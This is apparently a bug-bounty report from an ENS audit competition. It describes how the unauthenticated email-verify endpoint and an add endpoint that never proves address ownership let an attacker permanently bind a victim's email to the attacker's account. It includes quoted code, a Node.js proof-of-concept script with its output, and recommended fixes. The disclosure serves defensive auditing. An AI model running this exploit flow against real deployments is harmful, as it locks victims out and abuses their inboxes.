# 92583 w a low post notifications channels email verify ships with no requireauth and re checks nothing so one click on a genuine ens email transfers a victim s address to an attacker s account&#x20;

**Submitted on Sep 10th 2026 at 18:57:25 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92583
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information Notification/settings changes

## Description

## Summary

**`POST /notifications/channels/email/verify` has no `requireAuth`.** Compare its middleware chain with the add endpoint's, sixteen lines above it in the same file:

```tsx
// :29-33                                        // :172-176
  .post(                                           .post(
    '/',                                             '/verify',
    ...requireAuth,        <-- present               vValidator('json', verifyEmailChannelBodySchema),
    injectDb,                                        injectDb,      <-- no requireAuth
    vValidator('json', addEmailChannelBodySchema),   async (c) => {
```

The omission is local to this route, not a project-wide convention: `channels/telegram.ts:19-21` and `channels/push.ts:47-49` both spread `...requireAuth`, and no parent supplies it — `channels/index.ts` mounts `emailRoutes` with `.route('/', emailRoutes)` and no `.use()`, `notifications/index.ts` likewise, and `app/index.ts:14-22` mounts only `cors()`.

The handler resolves the row by token alone and flips it to verified:

```tsx
// :179-188
      const verification = await c.var.db.query.channelVerifications.findFirst({
        where: and(
          eq(TABLE.channelVerifications.token, token),
          eq(TABLE.channelVerifications.purpose, 'verify'),
          gt(TABLE.channelVerifications.expires_at, new Date()),
        ),
        with: { channel: true },
      })
// :195-201
      await c.var.db
        .update(TABLE.userChannels)
        .set({ status: 'verified', verified_at: new Date() })
        .where(eq(TABLE.userChannels.id, verification.channel_id))
```

It never re-runs the cross-account uniqueness check the *add* endpoint runs, never compares the channel's target to anything, and never binds the act of verifying to a session. So whoever clicks the link verifies whichever account's row the token belongs to.

An unauthenticated `/verify` is a correct choice on its own — the link is clicked from a mailbox. The defect is that nothing else in the flow establishes control of the address, and the redeem step is where the binding is actually granted.

The enabling half is the add endpoint, which is authenticated but takes no proof that the caller controls the address it is given. Its only cross-account guard can see `verified` rows:

```tsx
// :58-72
      const otherUserChannel = await c.var.db.query.userChannels.findFirst({
        where: and(
          eq(TABLE.userChannels.channel, 'email'),
          eq(TABLE.userChannels.target, email),
          eq(TABLE.userChannels.status, 'verified'),
        ),
      })

      if (otherUserChannel && otherUserChannel.user_id !== userId) {
        return c.json({ error: 'This email address is already linked to another account' }, 400)
      }
```

That state does not exist before anyone has verified, so **the first caller to claim an address wins**. A row is written under the *caller's* `user_id` with the *victim's* address as `target` (`:75-97`), a 24-hour token is minted (`:104-120`), and a genuine ENS verification mail goes to the victim (`:143-149`).

The mail carries no wallet address and no account identifier (`services/email/verification.ts:19-85`), so the recipient cannot tell whose account they are completing.

***

## Impact

1. The attacker signs in with a throwaway wallet: `POST /auth/nonce`, then `POST /auth/login` with a SIWE message for `app.ens.dev`. `addUserIfNotExists` creates the account on the spot. Free, unprivileged, unlimited.
2. The attacker calls `POST /notifications/channels/email` with the victim's address. A row is written under the **attacker's** `user_id` with `target` = the victim's address, and SendGrid mails the victim a real ENS verification link from `noreply@ens.dev`.
3. The victim receives a correctly DKIM-signed message, subject *Verify your email address - ENS Notifications*, indistinguishable from the one they would get for their own sign-up. They click it and press the button on ENS's own domain.
4. The page issues the unauthenticated `POST /notifications/channels/email/verify`. The **attacker's** row becomes `verified`.

What the attacker gets:

* **A verified notification channel on the victim's inbox.** `GET /notifications/channels` on the attacker's token lists the victim's address. Every notification the attacker's account is configured to emit is delivered, ENS-branded, to the victim.
* **The victim is permanently locked out.** `:67` now fires for anyone else, so the victim can never register their own address for ENS notifications. There is no self-service path to break the binding: the row belongs to the attacker's account, and `DELETE /notifications/channels/:id` is scoped to the owning `user_id`.
* **The victim's address is written into the SendGrid broadcast list under the attacker's user id** (`:233-243`, `addContactToList(..., verification.user_id)`).

The victim's part is one click on a link in a mail ENS genuinely sent them, on a page ENS genuinely serves. Steps 1, 2 and everything after step 4 need nothing from them at all.

One further note on step 2: the endpoint commits the row and the token **before** it attempts delivery (`:75-124` vs `:143-149`), and returns 500 on a delivery failure. So a failed send leaves the binding in place while telling the caller it failed.

***

## Root cause

| File:line                                                                 | What it does                                                                                                                        |
| ------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| `workers/api-worker/src/app/routes/notifications/channels/email.ts:29-33` | the add endpoint runs `...requireAuth` — but authenticates the *caller*, and never establishes that the caller controls the address |
| `:58-72`                                                                  | the only cross-account guard, and it can only see `status = 'verified'` rows                                                        |
| `:75-97`                                                                  | inserts the channel under the caller's `user_id` with the supplied address                                                          |
| `:104-120`                                                                | mints the token before any delivery attempt                                                                                         |
| `:143-149`                                                                | mails the verification link to the address                                                                                          |
| `:172-176`                                                                | **the verify endpoint's middleware chain omits `requireAuth`**                                                                      |
| `:179-188`                                                                | resolves the row by token alone                                                                                                     |
| `:195-201`                                                                | flips `status` to `verified` with no re-check of `:58-72` and no session binding                                                    |
| `:233-243`                                                                | writes the address into the broadcast list under `verification.user_id`                                                             |
| `workers/api-worker/src/services/email/verification.ts:19-85`             | the mail body carries no account identifier                                                                                         |

The unauthenticated `/verify` is a deliberate and correct choice on its own — the link is clicked from a mailbox. The defect is that the *bind* step never proved control and the *verify* step never re-establishes it.

***

## Not a duplicate

### #89445 — the one that genuinely overlaps

\#89445 (*One user's bounce or unsubscribe silently disables another user's notification channel*) cites `workers/api-worker/src/app/routes/notifications/channels/email.ts:59` under its own "Root cause / 1. Duplicate targets are creatable through the API", and reproduces the same seven-line `otherUserChannel` query. It also writes that an attacker can attach a victim's address to their own account before the victim verifies it. None of that is disputed.

What separates the two:

|                                            | #89445                                                                                         | This report                                                                            |
| ------------------------------------------ | ---------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| Root cause                                 | unscoped `eq(target)` predicates in the delivery sinks                                         | a state-changing route with no `requireAuth`, and a redeem step that re-checks nothing |
| Files it fixes                             | `queues/dlq.ts:203`, `services/delivery/push.ts:54, 119`, `app/routes/webhook/sendgrid.ts:172` | `app/routes/notifications/channels/email.ts:172-201`                                   |
| Mentions `/verify`                         | no                                                                                             | it is the finding                                                                      |
| Contains the string `requireAuth`          | no — zero occurrences                                                                          | it is the finding                                                                      |
| End state of the attacker's row in its PoC | `pending`, deliberately                                                                        | `verified`                                                                             |
| Impact                                     | an existing verified channel is disabled                                                       | a new channel is created and permanently held on someone else's address                |

**The project's own closure of #89445 asserts the negation of this report's central claim.** Its stated ground (`reports/89445.md:395`) reads:

> "Since notifications are only sent to verified channels and **an attacker cannot verify a channel tied to an address they don't control**, the practical path to attacker-triggered disablement of a victim's verified channel remains unproven."

They can. The PoC above does it, through a handler #89445 does not mention.

**The disjoint-fix test.** Neither fix set resolves the other, in either direction:

* Apply #89445's entire recommendation set — carry `user_id` / `channel_id` on the delivery rows and update by primary key — and this exploit is untouched: the attacker still holds a verified channel on the victim's inbox, and the victim is still refused at `:67`.
* Apply this report's fix — don't insert until the token is redeemed, re-run the uniqueness check at redeem, bind the verification to its requester — and every one of #89445's defects remains latent. Its push cases in particular are unaffected: `push.ts:54` has no `channel` filter at all, and push endpoints are registered through a separate route with no uniqueness check.
* The one fix that *looks* shared — tightening `:58-72` to drop `eq(status,'verified')` so any other user's row blocks the add — resolves #89445's email precondition and does **nothing** here, because the attacker binds *first*, when no row exists on any account, so a stricter predicate never fires.

### Everything else

* **#89444** (unauthenticated `POST /wallet/fund`) is a different route with a funds-drain impact. Worth noting for accuracy: #89444 states at `reports/89444.md:58` that `/wallet/fund` has *"No requireAuth, unlike every other state changing route in the worker."* That assertion is incorrect at this commit, and `/verify` is the counterexample — which is why these are two separate route-level omissions rather than one systemic middleware defect.
* **#92546** (unescaped ENS label in the Telegram template) is an output-encoding defect in the delivery templates.
* Known issues: the only api-worker entry in the whole document is the SendGrid **event webhook** failing open when `SENDGRID_WEBHOOK_VERIFICATION_KEY` is unset — a different handler (`app/routes/webhook/sendgrid.ts`), a different auth mechanism (ECDSA signature, not JWT middleware), and already fixed in this tree. **EXP-INPUT-009** is the push service worker; **EXP-GAP-006** is telemetry. Nothing in the known-issues list names `notifications/channels/email.ts`.

## Recommendation

1. Prove control before creating the row. Do not insert into `user_channels` on the add call; hold the pending claim in the verification record alone, and create the channel only when the token is redeemed.
2. Re-run the uniqueness check at redeem time. In `/verify`, repeat the `:58-72` query and refuse when the address is already verified on another account.
3. Bind the verification to its requester. Include the requesting `user_id` in the token record and require either an authenticated session matching it, or an explicit confirmation screen that names the account the address is being attached to.
4. Name the account in the mail. `services/email/verification.ts` should state which wallet address requested the binding, so an unexpected request is recognisable.
5. Rate-limit the bind endpoint per caller, not only per address — today `checkAndConsumeEmailVerificationRateLimit` is keyed on the target (`:126-129`), so one attacker can claim unlimited distinct addresses.
6. Give the address owner an exit. A one-click "this is not my account" link that deletes the binding regardless of who owns the row.

## Proof of Concept

## Proof of Concept

Executed against the real `api-worker` Hono app running locally on Cloudflare's dev runtime, with the project's own Postgres + Neon HTTP proxy stack and the project's own drizzle migrations. No live network or third-party service was touched — SendGrid is unreachable, which is why the add endpoint reports a delivery failure while still having committed the binding.

### Environment

```bash
# the project's own local DB stack (workers/api-worker/compose.yaml)
docker compose up -d postgres neon-proxy
DATABASE_URL='postgresql://postgres:postgres@localhost:5432/postgres' drizzle-kit migrate

# the real worker
cd workers/api-worker && vite dev --port 2999
```

`.dev.vars` uses a local JWT secret and a placeholder SendGrid key; `DATABASE_URL` points at `db.localtest.me`, the host `getDatabase` maps to the local Neon proxy (`src/core/database/index.ts:9-15`).

### The flow, driven through the real HTTP API

`.poc/email-hijack.mjs`, run with `node email-hijack.mjs` once the worker is up on `:2999`.

```jsx
const API = '<http://127.0.0.1:2999>'
const VICTIM_EMAIL = 'victim@example.com'

async function login(pk, label) {
  const account = privateKeyToAccount(pk)
  const { body: n } = await post('/auth/nonce')
  const message = siwe.createSiweMessage({
    address: account.address, chainId: 11155111, domain: 'app.ens.dev',
    nonce: n.nonce, uri: '<https://app.ens.dev>', version: '1', statement: 'Sign in to ENS',
  })
  const wallet = createWalletClient({ account, transport: http('<http://127.0.0.1:8545>') })
  const signature = await wallet.signMessage({ message })
  const res = await post('/auth/login', { address: account.address, message, signature, nonce: n.nonce })
  return { token: res.body?.token, address: account.address }
}

const attacker = await login('0x' + '22'.repeat(32), 'ATTACKER')
const add = await post('/notifications/channels/email', { email: VICTIM_EMAIL }, attacker.token)

// the token the worker mailed to the victim
const token = q("select token from channel_verifications order by created_at desc limit 1")

// the victim clicks the link — NO Authorization header
const verify = await post('/notifications/channels/email/verify', { token })

const chans = await get('/notifications/channels', attacker.token)

const victim = await login('0x' + '11'.repeat(32), 'VICTIM  ')
const victimAdd = await post('/notifications/channels/email', { email: VICTIM_EMAIL }, victim.token)
```

Actual output:

```
=== 1. Attacker signs in with a throwaway wallet (free, unprivileged) ===
ATTACKER login -> 200 JWT eyJhbGciOiJIUzI1NiIsInR5…

=== 2. Attacker binds the VICTIM's email to the ATTACKER's account ===
    (endpoint requires a JWT but no proof the caller owns the address)
    POST /notifications/channels/email -> 500 {"error":"Failed to send verification email"}

=== 3. The verification token the worker mailed to the victim ===
    channel_verifications.token = f9bac00d6271254ff7172642cd6b5347
    rows: 01a08c58-4575-70c7-8ebc-ba5b52ba78f7|email|victim@example.com|pending

=== 4. VICTIM clicks the link — the verify endpoint takes NO auth header ===
    POST /notifications/channels/email/verify (no Authorization) -> 200 {"message":"Email verified successfully"}
    rows now: 01a08c58-4575-70c7-8ebc-ba5b52ba78f7|email|victim@example.com|verified

=== 5. The ATTACKER now owns a VERIFIED channel on the victim's address ===
    GET /notifications/channels (attacker JWT) -> 200 [{"id":"01a08c58-699c-78e6-bc32-e2e7c1fc2d29",
      "channel":"email","status":"verified","status_reason":null,
      "verified_at":"2026-09-10T17:23:29.065Z","last_sent_at":null,"last_bounce_at":null,
      "last_verification_sent_at":null,"label":"victim@example.com"}]

=== 6. The VICTIM can never bind their own address again ===
VICTIM   login -> 200 JWT eyJhbGciOiJIUzI1NiIsInR5…
    POST /notifications/channels/email (victim JWT) -> 400 {"error":"This email address is already linked to another account"}
```

Every step ran against the real route handlers. The 500 at step 2 is the local SendGrid stub failing; the row and the token were already committed by then, which is exactly what the source shows at `:75-124` versus `:143-149`. In production that call returns 200 and the victim receives the mail.

***

## Preempting the likely closure arguments

**"The victim has to click something."** One click, on a link inside a message ENS genuinely sent from its own domain, landing on a page ENS genuinely serves — which is precisely what the selected impact row contemplates: *"with up to one click of user interaction, such as: Email."*

**"Nothing of value moved."** The victim's email address — an enumerated example in the row text — is now bound to a stranger's ENS account, the victim is permanently barred from registering it, and their inbox becomes a delivery channel a third party configures. The row does not ask for more.

**"The verify endpoint has to be unauthenticated."** Agreed, and that is not the fix being asked for. The fix is that the *bind* step must prove control before creating the row, and that the *verify* step must re-run the cross-account check that the bind step ran, at the moment it grants the binding.

**"An attacker could just spam email anyway."** They could not make ENS send it, from ENS's DKIM-signed domain, and they could not permanently deny the address to its owner.

**Recoverability.** None through the product. The row belongs to the attacker's `user_id`; `DELETE /notifications/channels/:id` is user-scoped (`$id.ts:62-76`), and `:67` blocks the victim from re-registering for as long as the attacker's row stands. Only a manual database edit clears it.

***
